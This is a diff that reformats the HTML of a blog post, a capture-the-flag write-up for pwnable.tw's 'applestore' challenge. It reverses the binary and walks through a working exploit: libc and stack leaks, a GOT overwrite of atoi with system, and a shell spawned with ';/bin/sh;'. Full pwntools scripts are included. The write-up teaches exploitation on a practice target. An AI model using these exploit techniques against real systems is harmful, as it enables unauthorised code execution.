@@ -1,193 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-<meta content="pwnable.tw - applestore" property="og:title"/>
-<meta content="article" property="og:type"/>
-<meta content="2020-08-27" property="og:published_time"/>
-<meta content="2020-11-06" property="og:modified_time"/>
-<meta content="Srikavin Ramkumar" property="og:author"/>
-<meta content="Writeup of pwnable.tw&#x27;s applestore challenge. We abuse a stack-based buffer overflow to gain remote code execution by overlaying the stack frame on top of the Global Offset Table. " property="og:description"/>
-<meta content="ctf-writeups" property="og:section"/>
-<meta content="pwnable.tw" property="og:tag"/>
-<meta content="binary-exploitation" property="og:tag"/>
-<meta content="pwntools" property="og:tag"/>
-<meta content="rce" property="og:tag"/>
-<meta content="/posts/pwnable-tw-applestore/" property="og:url"/>
-
-    <title>pwnable.tw - applestore - srikavin.me</title>
-    <link rel="stylesheet" href="/bundle.css">
-</head>
-
-<body>
-<nav>
-    <div class="nav-left">
-        <span>
-            <a href="https://srikavin.me" class="name">Srikavin Ramkumar</a>
-        </span>
-        <span>
-            <a href="/posts" class="nav-link">Posts</a>
-        </span>
-        <span>
-            <a class="nav-link" href="/tags">Tags</a>
-        </span>
-    </div>
-</nav>
-<section class="section">
-    <div class="container">
-        
-
-<div class="blog-container">
-    
-
-
-<div class="blog-header">
-    <h1 class="title">
-        
-        pwnable.tw - applestore
-        
-    </h1>
-    <div class="subtitle">
-                    <span>Posted on
-                        <span class="date" title="Created: 2020-08-27&#10;Updated: 2020-11-06">August 27, 2020*
-                        </span>
-
-                        in ctf-writeups
-                        
-                </span>
-    </div>
-    <div class="tags">
-        
-        
-        <a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="tag minimal interactive">pwnable.tw</span></a>
-        
-        
-        <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="tag minimal interactive">binary-exploitation</span></a>
-        
-        
-        <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="tag minimal interactive">pwntools</span></a>
-        
-        
-        <a href="&#x2F;tags&#x2F;rce&#x2F;"><span class="tag minimal interactive">rce</span></a>
-        
-    </div>
-</div>
-
-
-<div class="blog-content light">
-    <div class="blog-scrollspy">
-        <h1 class="scrollspy-label">Table of Contents</h1>
-        <ul>
-            
-            <li>
-                <a data-target="challenge" href="#challenge">Challenge</a>
-                
-            </li>
-            
-            <li>
-                <a data-target="reversing" href="#reversing">Reversing</a>
-                
-                <ul>
-                    
-                    <li>
-                        <a data-target="input-handler" href="#input-handler">Input Handler</a>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="adding-removing-items" href="#adding-removing-items">Adding/Removing Items</a>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="checkout" href="#checkout">Checkout</a>
-                        
-                    </li>
-                    
-                </ul>
-                
-            </li>
-            
-            <li>
-                <a data-target="exploitation" href="#exploitation">Exploitation</a>
-                
-                <ul>
-                    
-                    <li>
-                        <a data-target="triggering-the-vulnerability" href="#triggering-the-vulnerability">Triggering the vulnerability</a>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="overwriting-the-item" href="#overwriting-the-item">Overwriting the item</a>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="reading-arbitrary-addresses" href="#reading-arbitrary-addresses">Reading arbitrary addresses</a>
-                        
-                        <ul>
-                            
-                            <li>
-                                <a data-target="leaking-libc-base-address" href="#leaking-libc-base-address">Leaking Libc Base Address</a>
-                            </li>
-                            
-                            <li>
-                                <a data-target="leaking-a-stack-address" href="#leaking-a-stack-address">Leaking a stack address</a>
-                            </li>
-                            
-                        </ul>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="writing-to-arbitrary-addresses" href="#writing-to-arbitrary-addresses">Writing to arbitrary addresses</a>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="redirecting-execution-flow" href="#redirecting-execution-flow">Redirecting execution flow</a>
-                        
-                    </li>
-                    
-                    <li>
-                        <a data-target="obtaining-a-shell" href="#obtaining-a-shell">Obtaining a shell</a>
-                        
-                    </li>
-                    
-                </ul>
-                
-            </li>
-            
-            <li>
-                <a data-target="full-script" href="#full-script">Full script</a>
-                
-            </li>
-            
-        </ul>
-    </div>
-
-    <h1 id="challenge">Challenge</h1>
-<blockquote>
-<p>tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!</p>
-<p>nc chall.pwnable.tw 10104</p>
-</blockquote>
-<p>We're also given a <a href="https://pwnable.tw/static/chall/applestore">binary</a> and 
-<a href="https://pwnable.tw/static/libc/libc_32.so.6">libc</a> shared executable.</p>
-<h1 id="reversing">Reversing</h1>
-<p>When reversing binaries, I usually run the binary and compare its execution alongside the disassemby+pseudocode. 
-When we run the given binary, we're greeted by a menu with 6 options:</p>
-<span id="continue-reading"></span>
-<p><img src="/posts/pwnable-tw-applestore/5f4789fe5f6cee02e28f044e.png" alt="" /></p>
-<p>Going through and reversing each function isn't too difficult. The application allows us to view products, 
-add, remove, and list items in our cart, and checkout.</p>
-<h2 id="input-handler">Input Handler</h2>
-<p>The main function sets up I/O buffering, prints out the menu, clears a global variable, and calls the following function
-to handle input:</p>
-<pre style="background-color:#ffffff;">
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="pwnable.tw - applestore" property="og:title"><meta content="article" property="og:type"><meta content="2020-08-27" property="og:published_time"><meta content="2020-11-06" property="og:modified_time"><meta content="Srikavin Ramkumar" property="og:author"><meta content="Writeup of pwnable.tw&#x27;s applestore challenge. We abuse a stack-based buffer overflow to gain remote code execution by overlaying the stack frame on top of the Global Offset Table. " property="og:description"><meta content="ctf-writeups" property="og:section"><meta content="pwnable.tw" property="og:tag"><meta content="binary-exploitation" property="og:tag"><meta content="pwntools" property="og:tag"><meta content="rce" property="og:tag"><meta content="/posts/pwnable-tw-applestore/" property="og:url"><title>pwnable.tw - applestore - srikavin.me</title><link href="/favicon.png" rel="icon"><link href="/bundle.css" rel="stylesheet"></head><body><nav><div class="nav-left"><span><a href="https://srikavin.me" class="name">Srikavin Ramkumar</a> </span><span><a href="/posts" class="nav-link">Posts</a> </span><span><a href="/tags" class="nav-link">Tags</a></span></div></nav><section class="section"><div class="container"><div class="blog-container"><div class="blog-header"><h1 class="title">pwnable.tw - applestore</h1><div class="subtitle"><span>Posted on <span class="date" title="Created: 2020-08-27&#10;Updated: 2020-11-06">August 27, 2020* </span>in ctf-writeups</span></div><div class="tags"><a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="interactive minimal tag">pwnable.tw</span></a> <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="interactive minimal tag">binary-exploitation</span></a> <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="interactive minimal tag">pwntools</span></a> <a href="&#x2F;tags&#x2F;rce&#x2F;"><span class="interactive minimal tag">rce</span></a></div></div><div class="blog-content light"><div class="blog-scrollspy"><h1 class="scrollspy-label">Table of Contents</h1><ul><li><a href="#challenge" data-target="challenge">Challenge</a></li><li><a href="#reversing" data-target="reversing">Reversing</a><ul><li><a href="#input-handler" data-target="input-handler">Input Handler</a></li><li><a href="#adding-removing-items" data-target="adding-removing-items">Adding/Removing Items</a></li><li><a href="#checkout" data-target="checkout">Checkout</a></li></ul></li><li><a href="#exploitation" data-target="exploitation">Exploitation</a><ul><li><a href="#triggering-the-vulnerability" data-target="triggering-the-vulnerability">Triggering the vulnerability</a></li><li><a href="#overwriting-the-item" data-target="overwriting-the-item">Overwriting the item</a></li><li><a href="#reading-arbitrary-addresses" data-target="reading-arbitrary-addresses">Reading arbitrary addresses</a><ul><li><a href="#leaking-libc-base-address" data-target="leaking-libc-base-address">Leaking Libc Base Address</a></li><li><a href="#leaking-a-stack-address" data-target="leaking-a-stack-address">Leaking a stack address</a></li></ul></li><li><a href="#writing-to-arbitrary-addresses" data-target="writing-to-arbitrary-addresses">Writing to arbitrary addresses</a></li><li><a href="#redirecting-execution-flow" data-target="redirecting-execution-flow">Redirecting execution flow</a></li><li><a href="#obtaining-a-shell" data-target="obtaining-a-shell">Obtaining a shell</a></li></ul></li><li><a href="#full-script" data-target="full-script">Full script</a></li></ul></div><h1 id="challenge">Challenge</h1><blockquote><p>tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!</p><p>nc chall.pwnable.tw 10104</p></blockquote><p>We're also given a <a href="https://pwnable.tw/static/chall/applestore">binary</a> and <a href="https://pwnable.tw/static/libc/libc_32.so.6">libc</a> shared executable.</p><h1 id="reversing">Reversing</h1><p>When reversing binaries, I usually run the binary and compare its execution alongside the disassemby+pseudocode. When we run the given binary, we're greeted by a menu with 6 options:</p><span id="continue-reading"></span><p><img alt="" src="/posts/pwnable-tw-applestore/5f4789fe5f6cee02e28f044e.png"></p><p>Going through and reversing each function isn't too difficult. The application allows us to view products, add, remove, and list items in our cart, and checkout.</p><h2 id="input-handler">Input Handler</h2><p>The main function sets up I/O buffering, prints out the menu, clears a global variable, and calls the following function to handle input:</p><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">handler</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">) {
   </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> iVar1;
   </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> input;
@@ -228,9 +39,7 @@ to handle input:</p>
     }
   } </span><span style="font-weight:bold;color:#a71d5d;">while</span><span style="color:#323232;">( </span><span style="color:#0086b3;">true </span><span style="color:#323232;">);
 }
-</span></code></pre>
-<p>The <code>my_read</code> function simply reads n characters into the specified buffer.  The <code>list</code> function prints out a list of products:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><p>The <code>my_read</code> function simply reads n characters into the specified buffer. The <code>list</code> function prints out a list of products:</p><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">list</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">) {
   </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;=== Device List ===&quot;</span><span style="color:#323232;">);
   </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">%d</span><span style="color:#183691;">: iPhone 6 - $</span><span style="color:#0086b3;">%d\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,</span><span style="color:#0086b3;">1</span><span style="color:#323232;">,</span><span style="color:#0086b3;">199</span><span style="color:#323232;">);
@@ -240,15 +49,7 @@ to handle input:</p>
   </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">%d</span><span style="color:#183691;">: iPod Touch - $</span><span style="color:#0086b3;">%d\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,</span><span style="color:#0086b3;">5</span><span style="color:#323232;">,</span><span style="color:#0086b3;">199</span><span style="color:#323232;">);
   </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
 }
-</span></code></pre><h2 id="adding-removing-items">Adding/Removing Items</h2>
-<p>The <code>add</code> and <code>delete</code> functions are straightforward. They act on a doubly-linked list and respectively add an item or 
-remove an item. The <code>delete</code> function allows us to specify the index to delete, while <code>add</code> inserts a new item at the end of the linked list.</p>
-<p>The head node of the list is stored in a global variable named <code>myCart</code>. I defined the following struct to represent 
-each node in the list:</p>
-<p><img src="/posts/pwnable-tw-applestore/5f478a235f6cee02e28f0450.png" alt="" /></p>
-<h2 id="checkout">Checkout</h2>
-<p>The checkout function is interesting and contains a clear vulnerability:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><h2 id="adding-removing-items">Adding/Removing Items</h2><p>The <code>add</code> and <code>delete</code> functions are straightforward. They act on a doubly-linked list and respectively add an item or remove an item. The <code>delete</code> function allows us to specify the index to delete, while <code>add</code> inserts a new item at the end of the linked list.</p><p>The head node of the list is stored in a global variable named <code>myCart</code>. I defined the following struct to represent each node in the list:</p><p><img alt="" src="/posts/pwnable-tw-applestore/5f478a235f6cee02e28f0450.png"></p><h2 id="checkout">Checkout</h2><p>The checkout function is interesting and contains a clear vulnerability:</p><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">checkout</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">) {
   </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> iVar1;
   </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> in_GS_OFFSET;
@@ -271,33 +72,12 @@ each node in the list:</p>
   }
   </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
 }
-</span></code></pre>
-<p>This function calls <code>cart</code> which displays all of the items in the cart and returns the total value of the items in the 
-cart. If the total value of the cart is 0x1c06 (7174 in decimal), then a discounted iPhone 8 is added to our doubly-linked list.</p>
-<p>However, this new item isn't dynamically allocated using <code>malloc</code> -- it's stored on the stack. This means that its 
-value can change if another function's stack frame overlaps its location in memory.</p>
-<h1 id="exploitation">Exploitation</h1>
-<h2 id="triggering-the-vulnerability">Triggering the vulnerability</h2>
-<p>The stack item is only added if the total is 7174. It's not hard to find a combination of items that add up to 7174:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><p>This function calls <code>cart</code> which displays all of the items in the cart and returns the total value of the items in the cart. If the total value of the cart is 0x1c06 (7174 in decimal), then a discounted iPhone 8 is added to our doubly-linked list.</p><p>However, this new item isn't dynamically allocated using <code>malloc</code> -- it's stored on the stack. This means that its value can change if another function's stack frame overlaps its location in memory.</p><h1 id="exploitation">Exploitation</h1><h2 id="triggering-the-vulnerability">Triggering the vulnerability</h2><p>The stack item is only added if the total is 7174. It's not hard to find a combination of items that add up to 7174:</p><pre style="background-color:#ffffff;">
 <code><span style="color:#323232;">iPhone 6    ($199)  x  19 = 3781
 iPad Air 2  ($499)  x   6 = 2994
 iPad Mini 3 ($399)  x   1 =  399
 Total                     = 7174
-</span></code></pre>
-<p>Now we can add a stack address to the linked list by checking out. In this case, the vulnerable cart item will be at 
-index 27 (as displayed by the binary).</p>
-<h2 id="overwriting-the-item">Overwriting the item</h2>
-<p>Since the <code>handler</code> function continuously loops until the user chooses to exit, its stack frame remains consistent at 
-the same address. Thus, the stack frames of functions it calls will start at the same address.</p>
-<p>The diagram below shows the stack layout when calling <code>checkout</code> side-by-side with the stack layout when calling <code>delete</code>.</p>
-<p><object data="/posts/pwnable-tw-applestore/5f478a365f6cee02e28f0452.svg" type="image/svg+xml"></object></p>
-<p>There is an overlap of the memory referenced by the added cart item and the buffer for the input string in the <code>delete</code> 
-function. Thus, any operations on the stack cart item will reference our controlled buffer. Luckily, this same overlap 
-is consistent among <code>add</code>, <code>delete</code>, and <code>cart</code>.</p>
-<h2 id="reading-arbitrary-addresses">Reading arbitrary addresses</h2>
-<p>The cart function iterates through all of the values in the doubly-linked list and prints their name and price:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><p>Now we can add a stack address to the linked list by checking out. In this case, the vulnerable cart item will be at index 27 (as displayed by the binary).</p><h2 id="overwriting-the-item">Overwriting the item</h2><p>Since the <code>handler</code> function continuously loops until the user chooses to exit, its stack frame remains consistent at the same address. Thus, the stack frames of functions it calls will start at the same address.</p><p>The diagram below shows the stack layout when calling <code>checkout</code> side-by-side with the stack layout when calling <code>delete</code>.</p><object data="/posts/pwnable-tw-applestore/5f478a365f6cee02e28f0452.svg" type="image/svg+xml"></object><p>There is an overlap of the memory referenced by the added cart item and the buffer for the input string in the <code>delete</code> function. Thus, any operations on the stack cart item will reference our controlled buffer. Luckily, this same overlap is consistent among <code>add</code>, <code>delete</code>, and <code>cart</code>.</p><h2 id="reading-arbitrary-addresses">Reading arbitrary addresses</h2><p>The cart function iterates through all of the values in the doubly-linked list and prints their name and price:</p><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">cart</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">) {
   </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> iVar1;
   </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> in_GS_OFFSET;
@@ -328,16 +108,7 @@ is consistent among <code>add</code>, <code>delete</code>, and <code>cart</code>
   }
   </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;"> total;
 }
-</span></code></pre>
-<p>We can use the input buffer to overwrite the fields of the vulnerable cart item. We need to set the first character of 
-our payload to <code>y</code>, and the second character to anything. The next 16 bytes contain the values of the struct:</p>
-<p><object data="/posts/pwnable-tw-applestore/5f478a485f6cee02e28f0454.svg" type="image/svg+xml"></object></p>
-<p>We can set the name pointer to an arbitrary address to print the value at that address.</p>
-<h3 id="leaking-libc-base-address">Leaking Libc Base Address</h3>
-<p>By setting the name pointer to a global offset table (GOT) entry, we can leak the address of a function in libc. Since 
-we also have the libc file, we can calculate the base address of libc by subtracting the offset of the function.</p>
-<p>We can use the following to leak the address of <code>read</code> and calculate the base address of libc:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><p>We can use the input buffer to overwrite the fields of the vulnerable cart item. We need to set the first character of our payload to <code>y</code>, and the second character to anything. The next 16 bytes contain the values of the struct:</p><object data="/posts/pwnable-tw-applestore/5f478a485f6cee02e28f0454.svg" type="image/svg+xml"></object><p>We can set the name pointer to an arbitrary address to print the value at that address.</p><h3 id="leaking-libc-base-address">Leaking Libc Base Address</h3><p>By setting the name pointer to a global offset table (GOT) entry, we can leak the address of a function in libc. Since we also have the libc file, we can calculate the base address of libc by subtracting the offset of the function.</p><p>We can use the following to leak the address of <code>read</code> and calculate the base address of libc:</p><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">create_cart_struct</span><span style="color:#323232;">(name_ptr, price_int, next_ptr</span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#0086b3;">0</span><span style="color:#323232;">, prev_ptr</span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#0086b3;">0</span><span style="color:#323232;">):
 	</span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">p32(name_ptr) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">p32(price_int) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">p32(next_ptr) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">p32(prev_ptr)
 
@@ -347,20 +118,14 @@ cart(</span><span style="font-weight:bold;color:#a71d5d;">b</span><span style="c
 
 </span><span style="color:#0086b3;">LIBC_READ_ADDR </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">u32(r.read(</span><span style="color:#0086b3;">4</span><span style="color:#323232;">))
 libc.address </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LIBC_READ_ADDR </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#323232;">libc.symbols[</span><span style="color:#183691;">&#39;read&#39;</span><span style="color:#323232;">]
-</span></code></pre><h3 id="leaking-a-stack-address">Leaking a stack address</h3>
-<p>Now that we have the libc base address, we can leak a stack address by finding the value of the <code>char **environ</code> symbol 
-in libc. The value at the address pointed to by <code>environ</code> has a constant offset to the base stack pointer of delete. </p>
-<p>By using GDB, I found this offset to be 260. The following leaks the address pointed to by delete's EBP: </p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><h3 id="leaking-a-stack-address">Leaking a stack address</h3><p>Now that we have the libc base address, we can leak a stack address by finding the value of the <code>char **environ</code> symbol in libc. The value at the address pointed to by <code>environ</code> has a constant offset to the base stack pointer of delete.</p><p>By using GDB, I found this offset to be 260. The following leaks the address pointed to by delete's EBP:</p><pre style="background-color:#ffffff;">
 <code><span style="color:#323232;">cart(</span><span style="font-weight:bold;color:#a71d5d;">b</span><span style="color:#183691;">&#39;yy&#39; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">create_cart_struct(libc.symbols[</span><span style="color:#183691;">&#39;environ&#39;</span><span style="color:#323232;">], </span><span style="color:#0086b3;">0</span><span style="color:#323232;">))
 
 r.recvuntil(</span><span style="font-weight:bold;color:#a71d5d;">b</span><span style="color:#183691;">&#39;27: &#39;</span><span style="color:#323232;">)
 
 </span><span style="color:#0086b3;">ENVIRON_STACK </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">u32(r.recv(</span><span style="color:#0086b3;">4</span><span style="color:#323232;">))
 </span><span style="color:#0086b3;">DELETE_EBP </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">ENVIRON_STACK </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#0086b3;">260
-</span></code></pre><h2 id="writing-to-arbitrary-addresses">Writing to <del>arbitrary</del> addresses</h2>
-<p>The <code>delete</code> function is an interesting target to analyze when looking for a write primitive:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><h2 id="writing-to-arbitrary-addresses">Writing to <del>arbitrary</del> addresses</h2><p>The <code>delete</code> function is an interesting target to analyze when looking for a write primitive:</p><pre style="background-color:#ffffff;">
 <code><span style="font-weight:bold;color:#a71d5d;">void delete</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">) {
   </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> iVar1;
   </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> input;
@@ -402,35 +167,13 @@ LAB_08048a5e:
     cur_item </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> cur_item-&gt;next;
   } </span><span style="font-weight:bold;color:#a71d5d;">while</span><span style="color:#323232;">( </span><span style="color:#0086b3;">true </span><span style="color:#323232;">);
 }
-</span></code></pre>
-<p>When a item is deleted, the <code>prev</code> and <code>next</code> pointers are used to remove references to the deleted item from both the 
-previous and following item. Unfortunately, this means that both of the addresses referenced will be modified. Therefore, 
-the modified memory must be writeable. This rules out overwriting a GOT entry to point to a function in libc.</p>
-<h2 id="redirecting-execution-flow">Redirecting execution flow</h2>
-<p>An interesting way around this limitation is to use the previously leaked base stack address. If we can overwrite the 
-stored base pointer, then we can have writes to stack addresses performed somewhere else in memory. One target to place 
-the stack over is the global offset table (GOT).</p>
-<p>We can set the next pointer to the address of the stored EBP - 0xc (because <code>next-&gt;prev</code> would write to next + 0xc). </p>
-<p>Then we set the previous pointer to the address of atoi in the GOT + some offset. A suitable target on the stack that 
-we control is <code>input_str</code> in the <code>handler</code> function's stack frame. This is at offset <code>+0x22</code> from handlers's EBP. Thus, 
-if we set the previous pointer to <code>atoi + 0x22</code>, the GOT entry for <code>atoi</code> will be overwritten with our input.</p>
-<p>The following diagram illustrates our attack:</p>
-<p><object data="/posts/pwnable-tw-applestore/5f478a5e5f6cee02e28f0456.svg" type="image/svg+xml"></object></p>
-<p>The following overwrites the addresses:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><p>When a item is deleted, the <code>prev</code> and <code>next</code> pointers are used to remove references to the deleted item from both the previous and following item. Unfortunately, this means that both of the addresses referenced will be modified. Therefore, the modified memory must be writeable. This rules out overwriting a GOT entry to point to a function in libc.</p><h2 id="redirecting-execution-flow">Redirecting execution flow</h2><p>An interesting way around this limitation is to use the previously leaked base stack address. If we can overwrite the stored base pointer, then we can have writes to stack addresses performed somewhere else in memory. One target to place the stack over is the global offset table (GOT).</p><p>We can set the next pointer to the address of the stored EBP - 0xc (because <code>next-&gt;prev</code> would write to next + 0xc).</p><p>Then we set the previous pointer to the address of atoi in the GOT + some offset. A suitable target on the stack that we control is <code>input_str</code> in the <code>handler</code> function's stack frame. This is at offset <code>+0x22</code> from handlers's EBP. Thus, if we set the previous pointer to <code>atoi + 0x22</code>, the GOT entry for <code>atoi</code> will be overwritten with our input.</p><p>The following diagram illustrates our attack:</p><object data="/posts/pwnable-tw-applestore/5f478a5e5f6cee02e28f0456.svg" type="image/svg+xml"></object><p>The following overwrites the addresses:</p><pre style="background-color:#ffffff;">
 <code><span style="color:#323232;">delete(</span><span style="font-weight:bold;color:#a71d5d;">b</span><span style="color:#183691;">&#39;27&#39; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">create_cart_struct(</span><span style="color:#0086b3;">0x8048f88</span><span style="color:#323232;">, </span><span style="color:#0086b3;">0</span><span style="color:#323232;">, </span><span style="color:#0086b3;">DELETE_EBP </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#0086b3;">0xc</span><span style="color:#323232;">, elf.got[</span><span style="color:#183691;">&#39;atoi&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">0x22</span><span style="color:#323232;">))
-</span></code></pre><h2 id="obtaining-a-shell">Obtaining a shell</h2>
-<p>We can overwrite the GOT entry for atoi with the address of system. Now all we have to do is pass <code>/bin/sh</code> in the call 
-to atoi. Since our input buffer in <code>handle</code> overwrites the GOT entry, our input starts with the address of system and 
-includes <code>;/bin/sh;</code>:</p>
-<pre style="background-color:#ffffff;">
+</span></code></pre><h2 id="obtaining-a-shell">Obtaining a shell</h2><p>We can overwrite the GOT entry for atoi with the address of system. Now all we have to do is pass <code>/bin/sh</code> in the call to atoi. Since our input buffer in <code>handle</code> overwrites the GOT entry, our input starts with the address of system and includes <code>;/bin/sh;</code>:</p><pre style="background-color:#ffffff;">
 <code><span style="color:#323232;">r.sendafter(</span><span style="font-weight:bold;color:#a71d5d;">b</span><span style="color:#183691;">&#39;&gt;&#39;</span><span style="color:#323232;">, p32(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">]) </span><span style="font-weight:bold;color:#a71d5d;">+ b</span><span style="color:#183691;">&#39;;/bin/sh;&#39;</span><span style="color:#323232;">)
 
 r.interactive()
-</span></code></pre>
-<p><img src="/posts/pwnable-tw-applestore/5f478a755f6cee02e28f0458.png" alt="" /></p>
-<h1 id="full-script">Full script</h1>
-<pre style="background-color:#ffffff;">
+</span></code></pre><p><img alt="" src="/posts/pwnable-tw-applestore/5f478a755f6cee02e28f0458.png"></p><h1 id="full-script">Full script</h1><pre style="background-color:#ffffff;">
 <code><span style="font-style:italic;color:#969896;">#!/usr/bin/env python3
 
 </span><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
@@ -512,27 +255,4 @@ delete(</span><span style="font-weight:bold;color:#a71d5d;">b</span><span style=
 r.sendafter(</span><span style="font-weight:bold;color:#a71d5d;">b</span><span style="color:#183691;">&#39;&gt;&#39;</span><span style="color:#323232;">, p32(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">]) </span><span style="font-weight:bold;color:#a71d5d;">+ b</span><span style="color:#183691;">&#39;;/bin/sh;&#39;</span><span style="color:#323232;">)
 
 r.interactive()
-</span></code></pre>
-</div>
-
-
-</div>
-
-<script src="https://utteranc.es/client.js"
-        repo="srikavin/blog"
-        issue-term="url"
-        label="💬comments"
-        theme="github-light"
-        crossorigin="anonymous"
-        async>
-</script>
-
-    </div>
-</section>
-
-<script src="/bundle.js"></script>
- 
-
-</body>
-
-</html>
+</span></code></pre></div></div><script src="https://utteranc.es/client.js" async crossorigin="anonymous" issue-term="url" label="💬comments" repo="srikavin/blog" theme="github-light"></script></div></section><script src="/bundle.js"></script></body></html>
